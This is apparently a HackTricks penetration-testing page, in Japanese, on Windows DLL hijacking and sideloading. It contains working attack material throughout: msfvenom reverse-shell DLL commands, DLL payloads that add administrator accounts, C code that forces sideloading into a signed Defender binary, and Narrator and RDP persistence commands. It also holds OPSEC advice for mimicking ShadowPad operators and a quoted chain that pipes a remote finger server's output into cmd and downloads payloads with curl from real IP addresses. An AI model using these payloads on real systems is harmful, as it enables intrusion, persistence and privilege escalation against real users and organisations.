# Dll Hijacking

{{#include ../../../banners/hacktricks-training.md}}


## 基本情報

DLL Hijacking は、信頼されたアプリケーションに悪意のある DLL を読み込ませるよう操作する手法です。この用語は **DLL Spoofing, Injection, Side-Loading** のような複数の戦術を包含します。主にコード実行や永続化に用いられ、特権昇格にはあまり使われないこともあります。ここでは昇格に焦点を当てていますが、ハイジャック手法自体は目的にかかわらず大体同じです。

### 一般的な手法

アプリケーションの DLL 読み込み戦略に応じて、いくつかの手法が使われます:

1. **DLL Replacement**: 正規の DLL を悪意のあるものと差し替える。元の機能を維持するために DLL Proxying を併用することもあります。
2. **DLL Search Order Hijacking**: 悪意のある DLL を正規のものより先に検索されるパスに配置し、アプリケーションの検索パターンを悪用します。
3. **Phantom DLL Hijacking**: アプリケーションが存在しないはずの必須 DLL を読み込もうとする状況を作り、悪意のある DLL を用意します。
4. **DLL Redirection**: %PATH% や .exe.manifest / .exe.local のような検索パラメータを変更して、アプリケーションを悪意のある DLL へ向けます。
5. **WinSxS DLL Replacement**: WinSxS ディレクトリ内の正規 DLL を悪意のあるものと置き換える手法。DLL side-loading に関連することが多いです。
6. **Relative Path DLL Hijacking**: コピーしたアプリケーションと一緒にユーザー制御下のディレクトリに悪意のある DLL を置く手法で、Binary Proxy Execution 技術に似ています。

> [!TIP]
> HTML staging、AES-CTR 設定、.NET インプラントを DLL sideloading の上に層状に組み合わせるステップバイステップのチェーンについては、以下のワークフローを参照してください。

{{#ref}}
advanced-html-staged-dll-sideloading.md
{{#endref}}

## DLL が見つからない箇所の検出

システム内で欠落している DLL を見つける最も一般的な方法は、sysinternals の [procmon](https://docs.microsoft.com/en-us/sysinternals/downloads/procmon) を実行し、**次の 2 つのフィルタ**を設定することです:

![](<../../../images/image (961).png>)

![](<../../../images/image (230).png>)

そして **ファイル システム アクティビティ** のみを表示します:

![](<../../../images/image (153).png>)

一般的に **DLL の欠落** を探している場合は、これを数秒間実行したままにします。\
特定の実行ファイル内の **欠落 DLL** を探している場合は、**"Process Name" "contains" `<exec name>`** のような別のフィルタを設定し、実行してからイベントのキャプチャを停止してください。

## 欠落 DLL の悪用

特権プロセスが読み込もうとする DLL を、プロセスが検索する場所のいずれかに書き込めることが、昇格の最良の機会です。したがって、正規の DLL が存在するフォルダより先に検索されるフォルダに悪意の DLL を書き込める場合や、DLL が検索されるフォルダに書き込め、かつ元の DLL がどのフォルダにも存在しない場合に悪用できます。

### DLL 検索順序

[Microsoft のドキュメント](https://docs.microsoft.com/en-us/windows/win32/dlls/dynamic-link-library-search-order#factors-that-affect-searching) には、DLL がどのようにロードされるかが具体的に記載されています。

Windows アプリケーションは、あらかじめ定義された検索パスのセットに従い、特定の順序で DLL を探します。悪意の DLL がこれらのディレクトリのいずれかに戦略的に配置されると、正規の DLL より先に読み込まれることで DLL hijacking が発生します。これを防ぐには、アプリケーションが必要な DLL を参照する際に絶対パスを使用するようにすることが有効です。

32-bit システムでの **DLL 検索順** は以下の通りです:

1. アプリケーションが読み込まれたディレクトリ。
2. システムディレクトリ。パスを取得するには [GetSystemDirectory](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getsystemdirectorya) 関数を使用します。(_C:\Windows\System32_)
3. 16-bit システムディレクトリ。このディレクトリのパスを取得する関数はありませんが、検索されます。(_C:\Windows\System_)
4. Windows ディレクトリ。パスを取得するには [GetWindowsDirectory](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getwindowsdirectorya) 関数を使用します。
1. (_C:\Windows_)
5. カレントディレクトリ。
6. PATH 環境変数に列挙されているディレクトリ。ただし、これは **App Paths** レジストリキーで指定されたアプリケーション固有のパスを含みません。**App Paths** キーは DLL 検索パスの計算時に使用されません。

これは **SafeDllSearchMode** が有効になっている場合の **デフォルト** の検索順序です。無効にするとカレントディレクトリが 2 番目に昇格します。この機能を無効にするには、**HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Session Manager**\\**SafeDllSearchMode** レジストリ値を作成し、0 に設定します（デフォルトは有効）。

[LoadLibraryEx](https://docs.microsoft.com/en-us/windows/desktop/api/LibLoaderAPI/nf-libloaderapi-loadlibraryexa) 関数が **LOAD_WITH_ALTERED_SEARCH_PATH** とともに呼び出された場合、検索は LoadLibraryEx が読み込んでいる実行モジュールのディレクトリから開始されます。

最後に、**絶対パスを指定して DLL がロードされる場合**があることに注意してください。その場合、その DLL は **そのパスでのみ**検索されます（その DLL に依存関係がある場合、それらは名前で読み込まれたときと同様に検索されます）。

検索順序を変更する他の方法もありますが、ここでは説明しません。

### RTL_USER_PROCESS_PARAMETERS.DllPath を利用した sideloading の強制

新しく作成されるプロセスの DLL 検索パスに決定論的に影響を与える高度な方法は、ntdll のネイティブ API を使用してプロセスを作成する際に RTL_USER_PROCESS_PARAMETERS の DllPath フィールドを設定することです。ここに攻撃者制御のディレクトリを渡すことで、インポートされた DLL を名前で解決するターゲットプロセス（絶対パスを使わず、セーフな読み込みフラグを使っていない場合）に、当該ディレクトリから悪意のある DLL をロードさせることができます。

Key idea
- RtlCreateProcessParametersEx でプロセスパラメータを構築し、DllPath にドロッパー/アンパッカが配置されているような制御下のフォルダを指定します。
- RtlCreateUserProcess でプロセスを作成します。ターゲットバイナリが DLL を名前で解決するとき、ローダはこの供給された DllPath を参照し、悪意の DLL がターゲット EXE と同じ場所にない場合でも安定した sideloading を可能にします。

Notes/limitations
- これは作成される子プロセスに影響を与えます。現在のプロセスに影響を与える SetDllDirectory とは異なります。
- ターゲットは名前で DLL をインポートするか LoadLibrary で名前指定する必要があります（絶対パスを使用せず、LOAD_LIBRARY_SEARCH_SYSTEM32/SetDefaultDllDirectories を使用していないこと）。
- KnownDLLs やハードコードされた絶対パスはハイジャックできません。フォワーディングされたエクスポートや SxS は優先順位を変える可能性があります。

最小限の C の例 (ntdll、ワイド文字列、簡略化されたエラーハンドリング):

<details>
<summary>Full C example: forcing DLL sideloading via RTL_USER_PROCESS_PARAMETERS.DllPath</summary>
```c
#include <windows.h>
#include <winternl.h>
#pragma comment(lib, "ntdll.lib")

// Prototype (not in winternl.h in older SDKs)
typedef NTSTATUS (NTAPI *RtlCreateProcessParametersEx_t)(
PRTL_USER_PROCESS_PARAMETERS *pProcessParameters,
PUNICODE_STRING ImagePathName,
PUNICODE_STRING DllPath,
PUNICODE_STRING CurrentDirectory,
PUNICODE_STRING CommandLine,
PVOID Environment,
PUNICODE_STRING WindowTitle,
PUNICODE_STRING DesktopInfo,
PUNICODE_STRING ShellInfo,
PUNICODE_STRING RuntimeData,
ULONG Flags
);

typedef NTSTATUS (NTAPI *RtlCreateUserProcess_t)(
PUNICODE_STRING NtImagePathName,
ULONG Attributes,
PRTL_USER_PROCESS_PARAMETERS ProcessParameters,
PSECURITY_DESCRIPTOR ProcessSecurityDescriptor,
PSECURITY_DESCRIPTOR ThreadSecurityDescriptor,
HANDLE ParentProcess,
BOOLEAN InheritHandles,
HANDLE DebugPort,
HANDLE ExceptionPort,
PRTL_USER_PROCESS_INFORMATION ProcessInformation
);

static void DirFromModule(HMODULE h, wchar_t *out, DWORD cch) {
DWORD n = GetModuleFileNameW(h, out, cch);
for (DWORD i=n; i>0; --i) if (out[i-1] == L'\\') { out[i-1] = 0; break; }
}

int wmain(void) {
// Target Microsoft-signed, DLL-hijackable binary (example)
const wchar_t *image = L"\\??\\C:\\Program Files\\Windows Defender Advanced Threat Protection\\SenseSampleUploader.exe";

// Build custom DllPath = directory of our current module (e.g., the unpacked archive)
wchar_t dllDir[MAX_PATH];
DirFromModule(GetModuleHandleW(NULL), dllDir, MAX_PATH);

UNICODE_STRING uImage, uCmd, uDllPath, uCurDir;
RtlInitUnicodeString(&uImage, image);
RtlInitUnicodeString(&uCmd, L"\"C:\\Program Files\\Windows Defender Advanced Threat Protection\\SenseSampleUploader.exe\"");
RtlInitUnicodeString(&uDllPath, dllDir);      // Attacker-controlled directory
RtlInitUnicodeString(&uCurDir, dllDir);

RtlCreateProcessParametersEx_t pRtlCreateProcessParametersEx =
(RtlCreateProcessParametersEx_t)GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "RtlCreateProcessParametersEx");
RtlCreateUserProcess_t pRtlCreateUserProcess =
(RtlCreateUserProcess_t)GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "RtlCreateUserProcess");

RTL_USER_PROCESS_PARAMETERS *pp = NULL;
NTSTATUS st = pRtlCreateProcessParametersEx(&pp, &uImage, &uDllPath, &uCurDir, &uCmd,
NULL, NULL, NULL, NULL, NULL, 0);
if (st < 0) return 1;

RTL_USER_PROCESS_INFORMATION pi = {0};
st = pRtlCreateUserProcess(&uImage, 0, pp, NULL, NULL, NULL, FALSE, NULL, NULL, &pi);
if (st < 0) return 1;

// Resume main thread etc. if created suspended (not shown here)
return 0;
}
```
</details>

運用上の使用例
- 悪意のある xmllite.dll（必要な関数をエクスポートするか、実際のものをプロキシする）をあなたの DllPath ディレクトリに配置する。
- 上記の手法を使って名前で xmllite.dll を検索することが知られている署名済みバイナリを起動する。ローダーは指定された DllPath を介してインポートを解決し、あなたの DLL を sideloads する。

この手法は実際の攻撃でマルチステージの sideloading チェーンを駆動するために観測されています: 初期のランチャーがヘルパー DLL をドロップし、それがカスタム DllPath を指定して Microsoft-signed かつ hijackable なバイナリを生成し、staging ディレクトリから攻撃者の DLL を強制的に読み込ませます。


#### Windows ドキュメントに記載された dll 検索順序の例外

Windows のドキュメントには標準の DLL 検索順序に対するいくつかの例外が記載されています:

- 既にメモリにロードされているものと同じ名前の **DLL** が検出された場合、システムは通常の検索をバイパスします。代わりに、既にメモリにある DLL をデフォルトで使用する前にリダイレクトとマニフェストのチェックを行います。**この場合、システムは DLL の検索を行いません**。
- DLL が現在の Windows バージョンの **known DLL** として認識される場合、システムはその known DLL のバージョンおよびその依存 DLL を利用し、**検索プロセスを省略します**。レジストリキー **HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs** にはこれらの known DLL の一覧が格納されています。
- DLL が **依存関係を持つ場合**、これらの依存 DLL の検索は、初期の DLL がフルパスで指定されていたかどうかにかかわらず、それらが **モジュール名のみで指定されたかのように** 実行されます。

### 権限昇格

**要件**:

- 権限が **異なるプロセス**（horizontal or lateral movement に関連するもの）で動作している、または動作する予定で、かつ **DLL が欠如している** プロセスを特定する。
- **DLL** が **検索される** 任意の **ディレクトリ** に対して **書き込み権限** があることを確認する。これは実行ファイルのディレクトリやシステムパス内のディレクトリである可能性があります。

確かに、要件を見つけるのは面倒です。**デフォルトでは権限のある実行ファイルが DLL を欠いていることを見つけるのはかなり珍しい**上に、**システムパスのフォルダに書き込み権限があるのはさらに珍しい**（通常は不可能です）。しかし、設定ミスのある環境ではこれは発生し得ます。\
要件を満たす幸運に恵まれた場合は、[UACME](https://github.com/hfiref0x/UACME) プロジェクトを確認するとよいでしょう。プロジェクトの**主な目的は UAC を bypass すること**ですが、対象の Windows バージョン向けの Dll hijaking の **PoC** が見つかるかもしれません（おそらく書き込み権限のあるフォルダのパスを変更するだけで使えます）。

フォルダでの権限を**確認する**には次のようにします:
```bash
accesschk.exe -dqv "C:\Python27"
icacls "C:\Python27"
```
そして **PATH 内のすべてのフォルダの権限を確認する**:
```bash
for %%A in ("%path:;=";"%") do ( cmd.exe /c icacls "%%~A" 2>nul | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo. )
```
また、executable の imports と dll の exports は次のコマンドで確認できます:
```bash
dumpbin /imports C:\path\Tools\putty\Putty.exe
dumpbin /export /path/file.dll
```
For a full guide on how to **abuse Dll Hijacking to escalate privileges** with permissions to write in a **System Path folder** check:


{{#ref}}
writable-sys-path-dll-hijacking-privesc.md
{{#endref}}

### Automated tools

[**Winpeas** ](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)は system PATH 内の任意のフォルダに書き込み権限があるかをチェックします。\
この脆弱性を発見するための他の興味深い自動化ツールには **PowerSploit functions**: _Find-ProcessDLLHijack_, _Find-PathDLLHijack_ and _Write-HijackDll_ があります。

### Example

もし利用可能なシナリオを見つけた場合、成功させるために最も重要な点の一つは、実行ファイルがそこからインポートするすべての関数を少なくともエクスポートする dll を作成することです。ちなみに、Dll Hijacking は [escalate from Medium Integrity level to High **(bypassing UAC)**](../../authentication-credentials-uac-and-efs/index.html#uac) または[ **High Integrity to SYSTEM**](../index.html#from-high-integrity-to-system) に役立ちます。**.**  
実行を目的としたこの dll hijacking の調査内には、**how to create a valid dll** の例があります: [**https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows**](https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows)**.**\
さらに、次のセクションにはテンプレートとして、あるいは不要な関数をエクスポートした dll を作成するために役立ついくつかの基本的な dll コードが掲載されています。

## **Creating and compiling Dlls**

### **Dll Proxifying**

基本的に **Dll proxy** は、ロード時に **悪意のあるコードを実行する** 能力を持ちながら、実際のライブラリへのすべての呼び出しを **中継することによって** 期待どおりに **公開** し **動作** する Dll です。

ツール [**DLLirant**](https://github.com/redteamsocietegenerale/DLLirant) や [**Spartacus**](https://github.com/Accenture/Spartacus) を使うと、実行ファイルを指定してプロキシ化したいライブラリを選び、**プロキシ化された dll を生成する**、または **Dll を指定してプロキシ化された dll を生成する** といった操作が可能です。

### **Meterpreter**

**Get rev shell (x64):**
```bash
msfvenom -p windows/x64/shell/reverse_tcp LHOST=192.169.0.100 LPORT=4444 -f dll -o msf.dll
```
**meterpreter (x86) を取得する:**
```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.169.0.100 LPORT=4444 -f dll -o msf.dll
```
**ユーザーを作成する（x86、x64版は見当たりませんでした）：**
```bash
msfvenom -p windows/adduser USER=privesc PASS=Attacker@123 -f dll -o msf.dll
```
### 自分で作成する場合

いくつかの場合、コンパイルした Dll は victim process にロードされる複数の関数を必ず **export several functions** している必要があることに注意してください。これらの関数が存在しないと、**binary won't be able to load** ため、**exploit will fail**。

<details>
<summary>C DLL template (Win10)</summary>
```c
// Tested in Win10
// i686-w64-mingw32-g++ dll.c -lws2_32 -o srrstr.dll -shared
#include <windows.h>
BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved){
switch(dwReason){
case DLL_PROCESS_ATTACH:
system("whoami > C:\\users\\username\\whoami.txt");
WinExec("calc.exe", 0); //This doesn't accept redirections like system
break;
case DLL_PROCESS_DETACH:
break;
case DLL_THREAD_ATTACH:
break;
case DLL_THREAD_DETACH:
break;
}
return TRUE;
}
```
</details>
```c
// For x64 compile with: x86_64-w64-mingw32-gcc windows_dll.c -shared -o output.dll
// For x86 compile with: i686-w64-mingw32-gcc windows_dll.c -shared -o output.dll

#include <windows.h>
BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved){
if (dwReason == DLL_PROCESS_ATTACH){
system("cmd.exe /k net localgroup administrators user /add");
ExitProcess(0);
}
return TRUE;
}
```
<details>
<summary>C++ DLL の例（ユーザー作成付き）</summary>
```c
//x86_64-w64-mingw32-g++ -c -DBUILDING_EXAMPLE_DLL main.cpp
//x86_64-w64-mingw32-g++ -shared -o main.dll main.o -Wl,--out-implib,main.a

#include <windows.h>

int owned()
{
WinExec("cmd.exe /c net user cybervaca Password01 ; net localgroup administrators cybervaca /add", 0);
exit(0);
return 0;
}

BOOL WINAPI DllMain(HINSTANCE hinstDLL,DWORD fdwReason, LPVOID lpvReserved)
{
owned();
return 0;
}
```
</details>

<details>
<summary>代替の C DLL（スレッド エントリあり）</summary>
```c
//Another possible DLL
// i686-w64-mingw32-gcc windows_dll.c -shared -lws2_32 -o output.dll

#include<windows.h>
#include<stdlib.h>
#include<stdio.h>

void Entry (){ //Default function that is executed when the DLL is loaded
system("cmd");
}

BOOL APIENTRY DllMain (HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {
switch (ul_reason_for_call){
case DLL_PROCESS_ATTACH:
CreateThread(0,0, (LPTHREAD_START_ROUTINE)Entry,0,0,0);
break;
case DLL_THREAD_ATTACH:
case DLL_THREAD_DETACH:
case DLL_PROCESS_DEATCH:
break;
}
return TRUE;
}
```
</details>

## ケーススタディ：Narrator OneCore TTS Localization DLL Hijack (Accessibility/ATs)

Windows の Narrator.exe は起動時に予測可能な言語別のローカリゼーション DLL をプローブします。これをハイジャックすると arbitrary code execution と persistence を達成できます。

主なポイント
- プローブパス（現在のビルド）: `%windir%\System32\speech_onecore\engines\tts\msttsloc_onecoreenus.dll` (EN-US).
- レガシーパス（古いビルド）: `%windir%\System32\speech\engine\tts\msttslocenus.dll`.
- OneCore パスに書き込み可能な攻撃者管理下の DLL が存在すると、それがロードされ `DllMain(DLL_PROCESS_ATTACH)` が実行されます。エクスポートは不要です。

Procmon による検出
- フィルタ：`Process Name is Narrator.exe` and `Operation is Load Image` or `CreateFile`.
- Narrator を起動し、上記パスのロード試行を観察します。

最小限の DLL
```c
// Build as msttsloc_onecoreenus.dll and place in the OneCore TTS path
BOOL WINAPI DllMain(HINSTANCE h, DWORD r, LPVOID) {
if (r == DLL_PROCESS_ATTACH) {
// Optional OPSEC: DisableThreadLibraryCalls(h);
// Suspend/quiet Narrator main thread, then run payload
// (see PoC for implementation details)
}
return TRUE;
}
```
OPSEC の静音
- 単純な hijack は UI を読み上げ/ハイライトしてしまいます。静かにするには、attach 時に Narrator のスレッドを列挙し、メインスレッドを開いて（`OpenThread(THREAD_SUSPEND_RESUME)`）`SuspendThread` で停止し、自分のスレッドで処理を続けます。完全なコードは PoC を参照してください。

Trigger and persistence via Accessibility configuration
- User context (HKCU): `reg add "HKCU\Software\Microsoft\Windows NT\CurrentVersion\Accessibility" /v configuration /t REG_SZ /d "Narrator" /f`
- Winlogon/SYSTEM (HKLM): `reg add "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Accessibility" /v configuration /t REG_SZ /d "Narrator" /f`
- 上の設定により、Narrator を起動すると仕込んだ DLL が読み込まれます。secure desktop（ログオン画面）では CTRL+WIN+ENTER を押して Narrator を起動すると、あなたの DLL は secure desktop 上で SYSTEM として実行されます。

RDP-triggered SYSTEM execution (lateral movement)
- クラシック RDP セキュリティレイヤーを許可: `reg add "HKLM\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /v SecurityLayer /t REG_DWORD /d 0 /f`
- ホストに RDP 接続し、ログオン画面で CTRL+WIN+ENTER を押して Narrator を起動すると、あなたの DLL は secure desktop 上で SYSTEM として実行されます。
- RDP セッションが閉じると実行は停止します—迅速に inject/migrate してください。

Bring Your Own Accessibility (BYOA)
- 既存の Accessibility Tool (AT) のレジストリエントリ（例: CursorIndicator）をクローンし、任意のバイナリ/DLL を指すように編集してインポートし、`configuration` をその AT 名に設定できます。これにより Accessibility フレームワーク下で任意の実行をプロキシできます。

Notes
- `%windir%\System32` に書き込むことや HKLM の値を変更するには管理権限が必要です。
- ペイロードのロジックはすべて `DLL_PROCESS_ATTACH` に置けます; エクスポートは不要です。

## Case Study: CVE-2025-1729 - Privilege Escalation Using TPQMAssistant.exe

This case demonstrates Phantom DLL Hijacking in Lenovo's TrackPoint Quick Menu (`TPQMAssistant.exe`), tracked as CVE-2025-1729.

### Vulnerability Details

- **Component**: `TPQMAssistant.exe` located at `C:\ProgramData\Lenovo\TPQM\Assistant\`.
- **Scheduled Task**: `Lenovo\TrackPointQuickMenu\Schedule\ActivationDailyScheduleTask` runs daily at 9:30 AM under the context of the logged-on user.
- **Directory Permissions**: Writable by `CREATOR OWNER`, allowing local users to drop arbitrary files.
- **DLL Search Behavior**: Attempts to load `hostfxr.dll` from its working directory first and logs "NAME NOT FOUND" if missing, indicating local directory search precedence.

### Exploit Implementation

An attacker can place a malicious `hostfxr.dll` stub in the same directory, exploiting the missing DLL to achieve code execution under the user's context:
```c
#include <windows.h>

BOOL APIENTRY DllMain(HMODULE hModule, DWORD fdwReason, LPVOID lpReserved) {
if (fdwReason == DLL_PROCESS_ATTACH) {
// Payload: display a message box (proof-of-concept)
MessageBoxA(NULL, "DLL Hijacked!", "TPQM", MB_OK);
}
return TRUE;
}
```
### 攻撃フロー

1. 標準ユーザーとして、`hostfxr.dll` を `C:\ProgramData\Lenovo\TPQM\Assistant\` に配置する。
2. 現在のユーザーコンテキストで、スケジュールタスクが午前9:30に実行されるのを待つ。
3. タスク実行時に管理者がログオンしていると、悪意のある DLL が管理者のセッションで medium integrity で実行される。
4. 標準的な UAC bypass techniques を連鎖させ、medium integrity から SYSTEM privileges へ昇格させる。

## ケーススタディ: MSI CustomAction Dropper + DLL Side-Loading via Signed Host (wsc_proxy.exe)

脅威アクターは信頼された署名済みプロセスの下でペイロードを実行するために、MSI-based droppers と DLL side-loading を組み合わせることが多い。

Chain overview
- ユーザーが MSI をダウンロードする。GUI インストール中に CustomAction がサイレントで実行され（例: LaunchApplication や VBScript アクション）、埋め込まれたリソースから次段を再構成する。
- ドロッパーは正当で署名された EXE と悪意のある DLL を同じディレクトリに書き込む（例: Avast-signed wsc_proxy.exe + attacker-controlled wsc.dll）。
- 署名済み EXE が起動されると、Windows DLL search order により作業ディレクトリから最初に wsc.dll がロードされ、署名済み親プロセスの下で攻撃者コードが実行される（ATT&CK T1574.001）。

MSI analysis (what to look for)
- CustomAction table:
- 実行ファイルや VBScript を起動するエントリを探す。疑わしいパターン例: 背景で埋め込みファイルを実行する LaunchApplication。
- Orca (Microsoft Orca.exe) で CustomAction、InstallExecuteSequence、Binary の各テーブルを確認する。
- Embedded/split payloads in the MSI CAB:
- 管理者抽出: msiexec /a package.msi /qb TARGETDIR=C:\out
- または lessmsi を使用: lessmsi x package.msi C:\out
- VBScript CustomAction によって連結・復号される複数の小さなフラグメントを探す。一般的なフロー:
```vb
' VBScript CustomAction (high level)
' 1) Read multiple fragment files from the embedded CAB (e.g., f0.bin, f1.bin, ...)
' 2) Concatenate with ADODB.Stream or FileSystemObject
' 3) Decrypt using a hardcoded password/key
' 4) Write reconstructed PE(s) to disk (e.g., wsc_proxy.exe and wsc.dll)
```
wsc_proxy.exe を使った実践的な sideloading
- 同じフォルダに次の2つのファイルを置く:
- wsc_proxy.exe: 正当な署名済みホスト (Avast)。このプロセスはディレクトリからファイル名で wsc.dll をロードしようとする。
- wsc.dll: 攻撃者の DLL。特定のエクスポートが不要であれば DllMain で十分だが、そうでなければ proxy DLL を作成して必要なエクスポートを正規ライブラリにフォワードし、DllMain で payload を実行する。
- 最小限の DLL payload を作成する:
```c
// x64: x86_64-w64-mingw32-gcc payload.c -shared -o wsc.dll
#include <windows.h>
BOOL WINAPI DllMain(HINSTANCE h, DWORD r, LPVOID) {
if (r == DLL_PROCESS_ATTACH) {
WinExec("cmd.exe /c whoami > %TEMP%\\wsc_sideload.txt", SW_HIDE);
}
return TRUE;
}
```
- エクスポート要件がある場合、プロキシングフレームワーク（例: DLLirant/Spartacus）を使用して、ペイロードも実行するフォワーディングDLLを生成する。

- この手法はホストバイナリによる DLL 名解決に依存する。ホストが絶対パスやセーフロードフラグ（例: LOAD_LIBRARY_SEARCH_SYSTEM32/SetDefaultDllDirectories）を使用している場合、ハイジャックは失敗する可能性がある。
- KnownDLLs、SxS、および forwarded exports は優先順位に影響を与える可能性があり、ホストバイナリおよびエクスポートの選定時に考慮する必要がある。

## 署名された三点セット + 暗号化ペイロード（ShadowPad ケーススタディ）

Check Point は、Ink Dragon がコアのペイロードをディスク上で暗号化したまま正規ソフトと紛れ込ませるために、**3ファイルのトライアド**を使って ShadowPad を展開する方法を説明している：

1. **Signed host EXE** – AMD、Realtek、NVIDIA のようなベンダが悪用される（`vncutil64.exe`、`ApplicationLogs.exe`、`msedge_proxyLog.exe`）。攻撃者は実行ファイルの名前を Windows のバイナリに見えるように（例: `conhost.exe`）変更するが、Authenticode の署名は有効なままである。
2. **Malicious loader DLL** – EXE と同じ場所に期待される名前（`vncutil64loc.dll`、`atiadlxy.dll`、`msedge_proxyLogLOC.dll`）でドロップされる。DLL は通常 ScatterBrain フレームワークで難読化された MFC バイナリであり、その唯一の役割は暗号化されたブロブを見つけて復号し、ShadowPad をリフレクティブにマップすることだ。
3. **Encrypted payload blob** – 同じディレクトリに `<name>.tmp` として保存されることが多い。復号したペイロードをメモリマップした後、ローダはフォレンジック証拠を消すために TMP ファイルを削除する。

トレードクラフトの注意点:

* 署名済みEXEの名前を変更して（PEヘッダ内の元の `OriginalFileName` を保持したまま）Windowsのバイナリに見せかけつつベンダ署名を保持できるため、Ink Dragon が本当は AMD/NVIDIA のユーティリティである `conhost.exe` 風のバイナリを置く習慣を模倣するとよい。
* 実行ファイルが信頼されたままになるため、ほとんどの allowlisting 制御は悪意ある DLL が隣に置かれるだけで済む。ローダDLLのカスタマイズに注力せよ；署名された親は通常そのまま実行できる。
* ShadowPad の復号器は TMP ブロブがローダの隣にあり書き込み可能であることを期待しており、マッピング後にファイルをゼロ化できるようにする。ペイロードが読み込まれるまでディレクトリを可書き状態に保て；一度メモリ上に載ったら TMP ファイルは OPSEC のため安全に削除できる。

### LOLBAS ステージャ + staged archive sideloading チェーン (finger → tar/curl → WMI)

オペレータは DLL sideloading を LOLBAS と組み合わせ、ディスク上の唯一のカスタムアーティファクトが信頼された EXE の隣にある悪意ある DLL だけになるようにする：

- **Remote command loader (Finger):** 隠れた PowerShell が `cmd.exe /c` を起動し、Finger サーバからコマンドを取得して `cmd` にパイプする:

```powershell
powershell.exe Start-Process cmd -ArgumentList '/c finger Galo@91.193.19.108 | cmd' -WindowStyle Hidden
```
- `finger user@host` は TCP/79 テキストを取得する；`| cmd` はサーバ応答を実行し、オペレータがセカンドステージをサーバ側でローテーションできるようにする。

- **Built-in download/extract:** 無害な拡張子のアーカイブをダウンロードして展開し、sideload ターゲットと DLL をランダムな `%LocalAppData%` フォルダ下に配置する:

```powershell
$base = "$Env:LocalAppData"; $dir = Join-Path $base (Get-Random); curl -s -L -o "$dir.pdf" 79.141.172.212/tcp; mkdir "$dir"; tar -xf "$dir.pdf" -C "$dir"; $exe = "$dir\intelbq.exe"
```
- `curl -s -L` は進行を隠しリダイレクトに従う；`tar -xf` は Windows の組み込み tar を使用する。

- **WMI/CIM launch:** WMI 経由で EXE を起動し、テレメトリ上は CIM によって作成されたプロセスとして表示される状態でコロケートされた DLL をロードさせる:

```powershell
Invoke-CimMethod -ClassName Win32_Process -MethodName Create -Arguments @{CommandLine = "`"$exe`""}
```
- ローカルDLLを優先するバイナリ（例: `intelbq.exe`、`nearby_share.exe`）で動作する；ペイロード（例: Remcos）は信頼された名前で実行される。

- **Hunting:** `/p`、`/m`、`/c` が同時に現れる `forfiles` をアラート対象にする；管理スクリプト以外では稀である。


## ケーススタディ: NSIS ドロッパー + Bitdefender Submission Wizard sideload (Chrysalis)

最近の Lotus Blossom 侵入では、信頼されたアップデートチェーンを悪用して NSIS でパックされたドロッパを配布し、DLL sideload と完全にメモリ内で動作するペイロードをステージした。

運用フロー
- `update.exe` (NSIS) は `%AppData%\Bluetooth` を作成し、これを **HIDDEN** に設定し、名前を変えた Bitdefender Submission Wizard `BluetoothService.exe`、悪意ある `log.dll`、および暗号化ブロブ `BluetoothService` をドロップしてから EXE を起動する。
- ホスト EXE は `log.dll` をインポートし `LogInit`/`LogWrite` を呼ぶ。`LogInit` はブロブを mmap でロードする；`LogWrite` はカスタム LCG ベースのストリーム（定数 **0x19660D** / **0x3C6EF35F**、鍵素材は以前のハッシュから派生）でそれを復号し、バッファを平文のシェルコードで上書きし、一時を解放してそこへジャンプする。
- IAT を回避するため、ローダはエクスポート名をハッシュ化して API を解決する（**FNV-1a basis 0x811C9DC5 + prime 0x1000193**）、その後 Murmur スタイルのアバランチ（**0x85EBCA6B**）を適用し、ソルトされたターゲットハッシュと比較する。

メインシェルコード (Chrysalis)
- `gQ2JR&9;` キーを用いて add/XOR/sub を5回繰り返すことで PE ライクなメインモジュールを復号し、その後動的に `Kernel32.dll` → `GetProcAddress` をロードしてインポート解決を完了する。
- ランタイムで各文字に対するビット回転/XOR 変換を使って DLL 名文字列を再構築し、続いて `oleaut32`、`advapi32`、`shlwapi`、`user32`、`wininet`、`ole32`、`shell32` をロードする。
- 第二のリゾルバを使用し、**PEB → InMemoryOrderModuleList** を辿り、各エクスポートテーブルを4バイト単位で Murmur スタイルのミキシングで解析し、ハッシュが見つからない場合のみ `GetProcAddress` にフォールバックする。

埋め込まれた設定 & C2
- 設定はドロップされた `BluetoothService` ファイル内の **offset 0x30808**（サイズ **0x980**）にあり、キー `qwhvb^435h&*7` で RC4 復号され、C2 URL と User-Agent が明らかになる。
- ビーコンはドット区切りのホストプロファイルを構築し、タグ `4Q` を前置してから `HttpSendRequestA` を使った HTTPS 送信前にキー `vAuig34%^325hGV` で RC4 暗号化する。応答は RC4 復号され、タグスイッチでディスパッチされる（`4T` シェル、`4V` プロセス実行、`4W/4X` ファイル書込、`4Y` 読み出し/流出、`4\\` アンインストール、`4` ドライブ/ファイル列挙 + チャンク転送ケース）。
- 実行モードは CLI 引数で制御される：引数なし = 永続化をインストール（サービス/Run キー）して `-i` を指す；`-i` は自分自身を `-k` 付きで再起動；`-k` はインストールをスキップしてペイロードを実行する。

観測された別のローダ
- 同じ侵入では Tiny C Compiler をドロップし、`C:\ProgramData\USOShared\` から `svchost.exe -nostdlib -run conf.c` を実行し、`libtcc.dll` を隣に置いた。攻撃者提供の C ソースはシェルコードを埋め込み、コンパイルされ、PE をディスクに書き出すことなくメモリ上で実行された。再現は次で可能：
```cmd
C:\ProgramData\USOShared\tcc.exe -nostdlib -run conf.c
```
